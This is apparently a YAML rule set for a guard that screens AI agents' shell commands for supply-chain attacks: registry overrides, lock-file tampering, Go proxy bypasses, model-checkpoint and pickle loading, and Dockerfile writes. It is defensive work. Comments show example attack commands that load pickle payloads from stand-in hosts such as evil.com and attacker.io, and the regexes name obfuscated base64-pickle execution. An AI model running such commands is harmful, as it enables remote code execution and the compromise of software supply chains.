name: "Supply Chain Security"
description: "Detect dependency confusion, typosquatting, malicious package sources, and post-install script attacks"
version: "1.0.0"
author: "AgentShield Security Research"

defaults:
  protected_paths:
    - "~/.npmrc"
    - "~/.pypirc"
    - "~/.pip/**"
    - "~/.config/pip/**"
    - "~/.yarnrc"
    - "~/.cargo/config.toml"
    - "~/.m2/settings.xml"

rules:
  # === BLOCK: Non-standard package registries ===
  - id: "sc-block-npm-registry-override"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "npm\\s+(install|i|add).*--registry\\s+"
    decision: "BLOCK"
    reason: "npm install with non-standard registry override blocked. May be dependency confusion attack."

  - id: "sc-block-pip-extra-index"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      structural:
        executable: ["pip", "pip2", "pip3"]
        subcommand: "install"
        flags_any: ["extra-index-url"]
    decision: "BLOCK"
    reason: "pip install with --extra-index-url blocked. Risk of dependency confusion."

  - id: "sc-block-pip-index-url"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      structural:
        executable: ["pip", "pip2", "pip3"]
        subcommand: "install"
        flags_any: ["index-url"]
    decision: "BLOCK"
    confidence: 0.95
    reason: "pip install with --index-url replaces the primary PyPI index entirely, routing all package downloads to an attacker-controlled server. More severe than --extra-index-url."

  - id: "sc-block-git-url-rewrite"
    taxonomy: "supply-chain/config-tampering/package-config-edit"
    match:
      command_regex: "git\\s+config.*url\\..*\\.insteadOf"
    decision: "BLOCK"
    confidence: 0.97
    reason: "git config url.*.insteadOf silently rewrites all subsequent git fetch/clone URLs in the session. Used in supply chain attacks to redirect trusted repositories to attacker-controlled sources."

  - id: "sc-audit-conda-channel"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "(conda|mamba|micromamba)\\s+install.*(-c|--channel)\\s+(https?://|ftp://)"
    decision: "AUDIT"
    confidence: 0.90
    reason: "conda/mamba install from a URL-based channel bypasses verified conda-forge/defaults channels. Review before allowing."

  - id: "sc-block-pip-trusted-host"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      structural:
        executable: ["pip", "pip2", "pip3"]
        subcommand: "install"
        flags_any: ["trusted-host"]
    decision: "BLOCK"
    reason: "pip install with --trusted-host bypasses TLS verification."

  # === BLOCK: Maven custom repository injection ===
  - id: "sc-block-maven-custom-repo"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "mvn(w)?\\s+.*-DrepoUrl=https?://"
    decision: "BLOCK"
    confidence: 0.95
    reason: "mvn with -DrepoUrl= injects a custom Maven repository, enabling dependency confusion attacks. All packages may be resolved from the attacker-controlled server."

  - id: "sc-block-maven-repo-local-override"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "mvn(w)?\\s+.*-Dmaven\\.repo\\.local=(/tmp|/var/tmp|/dev/shm|/tmp/|~/)"
    decision: "BLOCK"
    confidence: 0.90
    reason: "mvn with -Dmaven.repo.local pointing to a temp or home path overrides the local Maven cache, allowing a pre-staged malicious artifact to be resolved instead of the real package."

  - id: "sc-audit-mvn-build"
    taxonomy: "supply-chain/dependency-confusion/package-install"
    match:
      command_regex: "mvn(w)?\\s+(install|compile|package|deploy|dependency:get|dependency:resolve)\\b"
    decision: "AUDIT"
    confidence: 0.75
    reason: "Maven build/install flagged for supply-chain review. Verify pom.xml repositories section before execution."

  # === BLOCK: NuGet/dotnet custom source injection ===
  - id: "sc-block-dotnet-custom-source"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "dotnet\\s+add\\s+package\\s+.*--source\\s+https?://"
    decision: "BLOCK"
    confidence: 0.95
    reason: "dotnet add package with --source pointing to a URL injects a custom NuGet feed. Enables dependency confusion — a package with the same name on the attacker server shadows the official one."

  - id: "sc-block-nuget-custom-source"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "nuget\\s+(install|restore)\\s+.*(-[Ss]ource|-[Ss]rc)\\s+https?://"
    decision: "BLOCK"
    confidence: 0.95
    reason: "nuget install/restore with a custom -Source URL bypasses the official NuGet gallery and enables dependency confusion attacks."

  - id: "sc-audit-dotnet-add"
    taxonomy: "supply-chain/dependency-confusion/package-install"
    match:
      command_regex: "dotnet\\s+add\\s+package\\b"
    decision: "AUDIT"
    confidence: 0.75
    reason: "dotnet add package flagged for supply-chain review. Verify the package source is the official NuGet gallery."

  # === BLOCK: Direct URL installs (bypass registry) ===
  - id: "sc-block-pip-url-install"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "pip\\s+install\\s+(https?://|git\\+)"
    decision: "BLOCK"
    reason: "pip install from URL bypasses PyPI. Download and inspect first."

  - id: "sc-block-npm-url-install"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "npm\\s+(install|i)\\s+(https?://|git\\+|git://)"
    decision: "BLOCK"
    reason: "npm install from URL bypasses registry verification."

  # === BLOCK: Config file tampering ===
  - id: "sc-block-npmrc-edit"
    taxonomy: "supply-chain/config-tampering/package-config-edit"
    match:
      command_regex: "(echo|cat|sed|tee).*\\.npmrc"
    decision: "BLOCK"
    reason: "Modification of .npmrc blocked — may redirect package resolution."

  - id: "sc-block-pypirc-edit"
    taxonomy: "supply-chain/config-tampering/package-config-edit"
    match:
      command_regex: "(echo|cat|sed|tee).*\\.pypirc"
    decision: "BLOCK"
    reason: "Modification of .pypirc blocked — may redirect package resolution."

  - id: "sc-block-go-mod-replace"
    taxonomy: "supply-chain/config-tampering/package-config-edit"
    match:
      command_regex: "go\\s+mod\\s+edit\\s+.*-replace\\b"
    decision: "BLOCK"
    confidence: 0.95
    reason: "go mod edit -replace redirects a Go module to an attacker-controlled path or repository, silently substituting a trusted dependency. AI agents have no legitimate need to replace module mappings."

  # === BLOCK: Go module proxy/sum-database bypass ===
  # Catches AI agents redirecting Go module downloads to non-official proxies
  # or disabling the Go checksum database (sum.golang.org), enabling silent
  # substitution of any Go dependency (supply-chain/dependency-confusion).
  # MITRE T1195.001

  - id: "sc-block-go-env-proxy-custom"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "go\\s+env\\s+-w\\s+GOPROXY=https?://"
      command_regex_exclude: "GOPROXY=https://(proxy\\.golang\\.org|goproxy\\.io)"
    decision: "BLOCK"
    confidence: 0.92
    reason: "go env -w GOPROXY= with a non-official proxy redirects all Go module downloads to an attacker-controlled server. Only proxy.golang.org and goproxy.io are sanctioned public proxies."

  - id: "sc-block-go-env-nosum"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "go\\s+env\\s+-w\\s+(GONOSUMCHECK|GONOSUMDB)=\\S"
    decision: "BLOCK"
    confidence: 0.95
    reason: "go env -w GONOSUMCHECK/GONOSUMDB= disables the Go checksum database, allowing tampered modules to pass integrity checks undetected."

  - id: "sc-block-go-nosum-env-export"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "export\\s+(GONOSUMCHECK|GONOSUMDB)="
    decision: "BLOCK"
    confidence: 0.95
    reason: "Exporting GONOSUMCHECK or GONOSUMDB disables Go module checksum verification, enabling dependency substitution attacks."

  - id: "sc-block-goflags-insecure-export"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "export\\s+GOFLAGS=.*(-insecure|-goflags|-mod=mod)"
    decision: "BLOCK"
    confidence: 0.90
    reason: "Exporting GOFLAGS with -insecure or -mod=mod disables Go module security controls globally for the session."

  - id: "sc-block-goproxy-env-export"
    taxonomy: "supply-chain/dependency-confusion/non-standard-registry"
    match:
      command_regex: "export\\s+GOPROXY=https?://"
      command_regex_exclude: "GOPROXY=https://(proxy\\.golang\\.org|goproxy\\.io)"
    decision: "BLOCK"
    confidence: 0.92
    reason: "Exporting GOPROXY pointing to a non-official URL redirects all Go module downloads to an attacker-controlled proxy."

  # === BLOCK: Post-install script manipulation ===
  - id: "sc-block-npm-ignore-scripts-off"
    taxonomy: "supply-chain/package-install/security-control-bypass"
    match:
      command_regex: "npm\\s+config\\s+set\\s+ignore-scripts\\s+false"
    decision: "BLOCK"
    reason: "Re-enabling npm post-install scripts is risky. Keep ignore-scripts=true in agent context."

  # === AUDIT: Standard package installs ===
  - id: "sc-audit-npm-install"
    taxonomy: "supply-chain/package-install/standard-package-install"
    match:
      command_prefix: ["npm install", "npm i ", "npm add", "npx "]
    decision: "AUDIT"
    reason: "npm package install flagged for supply-chain review."

  - id: "sc-audit-pip-install"
    taxonomy: "supply-chain/package-install/standard-package-install"
    match:
      command_prefix: ["pip install", "pip3 install", "pipx install"]
    decision: "AUDIT"
    reason: "pip package install flagged for supply-chain review."

  - id: "sc-audit-yarn-add"
    taxonomy: "supply-chain/package-install/standard-package-install"
    match:
      command_prefix: ["yarn add", "pnpm add", "pnpm install"]
    decision: "AUDIT"
    reason: "Yarn/pnpm package install flagged for supply-chain review."

  - id: "sc-audit-brew-install"
    taxonomy: "supply-chain/package-install/standard-package-install"
    match:
      command_prefix: ["brew install", "brew cask install"]
    decision: "AUDIT"
    reason: "Homebrew install flagged for supply-chain review."

  - id: "sc-audit-go-get"
    taxonomy: "supply-chain/package-install/standard-package-install"
    match:
      command_prefix: ["go get ", "go install "]
    decision: "AUDIT"
    reason: "Go module fetch flagged for supply-chain review."

  - id: "sc-audit-cargo-install"
    taxonomy: "supply-chain/package-install/standard-package-install"
    match:
      command_prefix: ["cargo install", "cargo add"]
    decision: "AUDIT"
    reason: "Cargo package install flagged for supply-chain review."

  - id: "sc-audit-gem-install"
    taxonomy: "supply-chain/package-install/standard-package-install"
    match:
      command_prefix: ["gem install"]
    decision: "AUDIT"
    reason: "RubyGems install flagged for supply-chain review."

  # === BLOCK: Direct shell writes/overwrites to dependency lock files ===
  #
  # Lock files are machine-generated checksums — no human or agent has a
  # legitimate reason to write to them directly via shell redirects or
  # file-copy operations. Such writes can pin a compromised package version
  # or strip integrity hashes to allow substitution attacks.
  # MITRE T1195.001 — Supply Chain Compromise: Compromise Software Dependencies
  - id: "sc-block-lockfile-overwrite"
    taxonomy: "supply-chain/dependency-confusion/package-manifest-tampering"
    match:
      command_regex: "(echo|cat|tee|printf|dd|cp|mv)(\\s+\\S+)*\\s+.*>+\\s*(package-lock\\.json|npm-shrinkwrap\\.json|yarn\\.lock|pnpm-lock\\.yaml|poetry\\.lock|Pipfile\\.lock|go\\.sum|Cargo\\.lock|Gemfile\\.lock|composer\\.lock|gradle\\.lockfile)|\\b(cp|mv)\\b.*\\s+(package-lock\\.json|npm-shrinkwrap\\.json|yarn\\.lock|pnpm-lock\\.yaml|poetry\\.lock|Pipfile\\.lock|go\\.sum|Cargo\\.lock|Gemfile\\.lock|composer\\.lock|gradle\\.lockfile)\\s*$"
    decision: "BLOCK"
    reason: "Direct shell write to dependency lock file — lock files are machine-generated checksums. Hand-editing can pin a compromised version or strip integrity hashes. MITRE T1195.001."
    confidence: 0.95

  # === AUDIT: Lock file modifications via tools (rm/sed/perl/python) ===
  - id: "sc-audit-lockfile-edit"
    taxonomy: "supply-chain/dependency-confusion/package-manifest-tampering"
    match:
      command_regex: "(rm|sed|perl|python)\\s+.*(package-lock|yarn\\.lock|Pipfile\\.lock|poetry\\.lock|go\\.sum|Cargo\\.lock|Gemfile\\.lock)"
    decision: "AUDIT"
    reason: "Lock file modification flagged — may indicate supply-chain tampering. MITRE T1195.001."

  # === BLOCK: ML model poisoning (LLM04) ===

  - id: "sc-block-ml-dataset-write"
    taxonomy: "supply-chain/model-poisoning/training-data-tampering"
    match:
      command_regex: "(echo|cat|tee|python[23]?|node)\\s+.*>>?\\s+.*(train|dataset|data|finetune)/.*\\.(jsonl|csv|parquet|tsv)"
    decision: "BLOCK"
    confidence: 0.90
    reason: "Writing to ML training dataset files blocked. May introduce poisoned examples into fine-tuning pipeline (LLM04)."

  - id: "sc-block-ml-dataset-append"
    taxonomy: "supply-chain/model-poisoning/training-data-tampering"
    match:
      command_regex: "cat\\s+.+\\s*>>\\s+.*(train|finetune|dataset).*\\.(jsonl|csv|parquet)"
    decision: "BLOCK"
    confidence: 0.88
    reason: "Appending data to training dataset file blocked. Risk of training data poisoning (LLM04)."

  - id: "sc-block-ml-checkpoint-replace"
    taxonomy: "supply-chain/model-poisoning/checkpoint-substitution"
    match:
      command_regex: "(cp|mv|wget|curl)\\s+.+\\s+(checkpoints?|models?)/.*\\.(pt|pth|pkl|bin|safetensors|gguf|ckpt)(\\s|$)"
    decision: "BLOCK"
    confidence: 0.88
    reason: "Writing to ML model checkpoint file blocked. PyTorch .pt/.pkl files can contain pickle exploits. Risk of checkpoint substitution attack (LLM04)."

  - id: "sc-audit-ml-checkpoint-write"
    taxonomy: "supply-chain/model-poisoning/checkpoint-substitution"
    match:
      command_regex: "(cp|mv)\\s+.*\\.(pt|pth|pkl|safetensors|gguf|ckpt)(\\s|$)"
    decision: "AUDIT"
    confidence: 0.80
    reason: "Model checkpoint file copy or move flagged. Verify source integrity before deploying (LLM04)."

  # === BLOCK/AUDIT: Hugging Face model downloads (LLM04 — checkpoint substitution) ===
  # AI agents can pull arbitrary models from the HF Hub using huggingface-cli or
  # Python APIs. Malicious repos ship PyTorch .bin/.pkl files with pickle exploits
  # that execute arbitrary code on model load (AML.T0010). These rules gate all
  # model download operations so a human can verify the source repo before the
  # model is materialised on disk.

  - id: "sc-block-hf-cli-download"
    taxonomy: "supply-chain/model-poisoning/checkpoint-substitution"
    match:
      command_regex: "\\bhuggingface-cli\\b\\s+download\\b"
    decision: "BLOCK"
    confidence: 0.93
    reason: "huggingface-cli download pulls a model repo from the HF Hub. Untrusted repos can ship pickle-exploit payloads that execute on load. Human review of the source required (LLM04, AML.T0010)."

  - id: "sc-audit-hf-from-pretrained"
    taxonomy: "supply-chain/model-poisoning/checkpoint-substitution"
    match:
      command_regex: "python[23]?\\s+(-c\\s+['\"]?|\\S+\\.py\\b).*\\bfrom_pretrained\\s*\\("
    decision: "AUDIT"
    confidence: 0.87
    reason: "Python command calling from_pretrained() to download a model from HF Hub or a remote path. Verify the source repo is trusted before execution (LLM04)."

  - id: "sc-audit-hf-hub-download"
    taxonomy: "supply-chain/model-poisoning/checkpoint-substitution"
    match:
      command_regex: "python[23]?\\s+(-c\\s+['\"]?|\\S+\\.py\\b).*\\bhf_hub_download\\s*\\("
    decision: "AUDIT"
    confidence: 0.87
    reason: "Python command calling hf_hub_download() to pull a specific model file from HF Hub. Ensure the repo and revision are trusted before execution (LLM04)."

  # ── Inference-Time Backdoor Activation ────────────────────────────────────
  #
  # Taxonomy: supply-chain/model-poisoning/inference-time-backdoor-activation
  # OWASP LLM03 — Training Data Poisoning, LLM04 — Model/Supply Chain Vulnerabilities
  # MITRE AML.T0010, T1203 — Exploitation for Client Execution
  #
  # Inference-time backdoor activation occurs when a model checkpoint contains
  # hidden behaviours (triggers) that activate only when a specific input pattern
  # is seen at inference time. The primary supply-chain vector is:
  #
  #   python -c "import torch; m = torch.load('http://evil.com/backdoor.pt')"
  #   python -c "import pickle, urllib; pickle.load(urllib.request.urlopen('http://attacker.io/p.pkl'))"
  #
  # Why this differs from checkpoint-substitution: the attack payload is in the
  # model itself — activating silently during normal inference — rather than in
  # a new file dropped on disk. The detection signal is loading from a URL at
  # runtime, especially via torch.load() (which is pickle-based) or direct
  # pickle.load() on a network-fetched object.

  # === BLOCK: torch.load from URL (pickle RCE on model load) ===
  #
  # torch.load() uses pickle by default. Loading from a URL with weights_only=False
  # (the default before PyTorch 2.0) executes arbitrary code in the pickle payload.
  # An AI agent loading a model checkpoint from a remote URL without weights_only=True
  # is a critical supply-chain risk.

  - id: "sc-block-torch-load-url"
    taxonomy: "supply-chain/model-poisoning/inference-time-backdoor-activation"
    match:
      command_regex: "python[23]?\\b.*\\btorch\\.load\\s*\\(\\s*['\"]https?://"
    decision: "BLOCK"
    confidence: 0.96
    reason: "torch.load() called with an HTTP/HTTPS URL — loads a remote pickle payload that executes arbitrary code at model load time. Use torch.load(path, weights_only=True) with a trusted local path only (OWASP LLM04, AML.T0010)."

  # === BLOCK: pickle.load from urllib/http response (remote code execution) ===
  #
  # pickle.load(urllib.request.urlopen(url)) is a textbook RCE pattern:
  # pickle deserialises arbitrary bytecode from the network stream.

  - id: "sc-block-pickle-load-url"
    taxonomy: "supply-chain/model-poisoning/inference-time-backdoor-activation"
    match:
      command_regex: "python[23]?\\b.*\\bpickle\\.load\\s*\\(.*urllib.*urlopen|python[23]?\\b.*\\bpickle\\.loads?\\s*\\(.*requests?\\.get"
    decision: "BLOCK"
    confidence: 0.95
    reason: "pickle.load() on a network-fetched response — direct remote code execution via pickle deserialization. Never deserialize pickle data from untrusted network sources (OWASP LLM04, MITRE T1203)."

  # === BLOCK: exec(pickle.loads(base64.b64decode(...))) obfuscated payload ===
  #
  # A common obfuscation: base64-encode a pickle payload, pass it to
  # pickle.loads(), then exec the result. This is a model-backdoor
  # activation pattern used to hide the payload in seemingly innocuous data.

  - id: "sc-block-exec-pickle-decode"
    taxonomy: "supply-chain/model-poisoning/inference-time-backdoor-activation"
    match:
      command_regex: "python[23]?\\b.*\\bexec\\s*\\(.*pickle\\.loads?\\s*\\(.*base64|python[23]?\\b.*\\bpickle\\.loads?\\s*\\(.*base64\\.b64decode"
    decision: "BLOCK"
    confidence: 0.97
    reason: "exec(pickle.loads(base64.b64decode(...))) — obfuscated remote code execution via base64-encoded pickle payload. Classic inference-time backdoor activation pattern (OWASP LLM04, MITRE T1203, AML.T0010)."

  # === AUDIT/BLOCK: Dockerfile and container image tampering (issue #171) ===
  #
  # Dockerfiles define the entire build environment for a container image.
  # An AI agent that writes malicious instructions to a Dockerfile can:
  #   - Inject a backdoor into every container built from that image
  #   - Embed exfiltration RUN steps that run at build time (within CI/CD pipelines)
  #   - Hardcode attacker-controlled ENV variables or expose sensitive files
  #   - Override the entrypoint to run a reverse shell on container start
  #
  # Shell-level writes to Dockerfile and docker-compose.yml are blocked here.
  # MCP write_file calls to the same paths are covered in mcp-supply-chain.yaml.
  #
  # MITRE T1612   — Build Image on Host
  # MITRE T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain

  - id: "sc-block-dockerfile-write"
    taxonomy: "supply-chain/build-pipeline/cicd-config-injection"
    match:
      command_regex: "(?:echo|cat|printf|python[23]?|node|sed)\\s+.*>+\\s*(?:[./]*/)?Dockerfile(?:\\.[a-zA-Z0-9_-]+)?\\b"
    decision: "BLOCK"
    confidence: 0.93
    reason: "Shell write to Dockerfile detected. Injecting malicious RUN/COPY/ENV instructions can backdoor every container built from this image. MITRE T1612."

  - id: "sc-block-dockerfile-tee"
    taxonomy: "supply-chain/build-pipeline/cicd-config-injection"
    match:
      command_regex: "\\btee\\b\\s+(?:-a\\s+)?(?:[./]*/)?Dockerfile(?:\\.[a-zA-Z0-9_.-]+)?\\b"
    decision: "BLOCK"
    confidence: 0.93
    reason: "tee write to Dockerfile detected — tee copies stdin to file as positional arg. Injecting malicious content backdoors every container built from this image. MITRE T1612."

  - id: "sc-block-docker-compose-write"
    taxonomy: "supply-chain/build-pipeline/cicd-config-injection"
    match:
      command_regex: "(?:echo|cat|printf|sed|tee)\\s+.*>+\\s*(?:[./]*/)?docker-compose(?:\\.[a-zA-Z0-9_-]+)?\\.ya?ml\\b"
    decision: "BLOCK"
    confidence: 0.90
    reason: "Shell write to docker-compose.yml detected. Tampering with compose files can mount host paths, disable security options, or add malicious service definitions. MITRE T1612."

  # === AUDIT: Global installs ===
  # Global package installs affect the entire system rather than a single project,
  # giving installed packages elevated access to the shell PATH and user profile.
  # An AI agent could install a maliciously-named package (dependency confusion,
  # typosquatting) that silently executes on every new shell. MITRE T1195.
  - id: "sc-audit-global-install"
    taxonomy: "supply-chain/package-install/global-package-install"
    match:
      command_regex: "(npm|pip|pip3)\\s+install\\s+(-g|--global)"
    decision: "AUDIT"
    confidence: 0.80
    reason: "Global npm/pip install has wider system impact than a local install — flagged for review (MITRE T1195)."

  # === AUDIT: yarn and pnpm global installs ===
  # yarn v1 uses 'yarn global add <pkg>' and 'yarn add --global <pkg>'.
  # pnpm uses 'pnpm add -g <pkg>' or 'pnpm install -g <pkg>'.
  # Both add packages to the user's global bin, equivalent risk to npm install -g.
  - id: "sc-audit-yarn-pnpm-global-install"
    taxonomy: "supply-chain/package-install/global-package-install"
    match:
      command_regex: "(yarn\\s+global\\s+add\\b|yarn\\s+add\\s+--global\\b|pnpm\\s+(add|install)\\s+(-g|--global)\\b)"
    decision: "AUDIT"
    confidence: 0.80
    reason: "Global yarn/pnpm install has wider system impact than a local install — flagged for review (MITRE T1195)."

  # === AUDIT: RAG/vector database writes (issue #205) ===
  #
  # Vector databases (ChromaDB, Pinecone, Weaviate, Qdrant, FAISS) store the
  # knowledge bases that RAG-based AI systems query at inference time. Injecting
  # malicious documents into these stores poisons AI-grounded outputs without
  # modifying the underlying model — a supply chain attack on the retrieval layer.
  #
  # Attack pattern: python -c "import chromadb; c.get_collection('docs').add(...)"
  # This executes a vector DB write via Python's subprocess or inline -c flag.
  # Also catches curl-based REST API writes to locally-hosted vector DB endpoints.
  #
  # Decision: AUDIT (not BLOCK) — agents legitimately populate and update
  # knowledge bases. Human review is warranted to detect injected adversarial
  # content in new documents.
  #
  # OWASP LLM08 — Vector and Embedding Weaknesses
  # MITRE AML.T0010 — Poison Training Data
  - id: "sc-audit-vector-db-write"
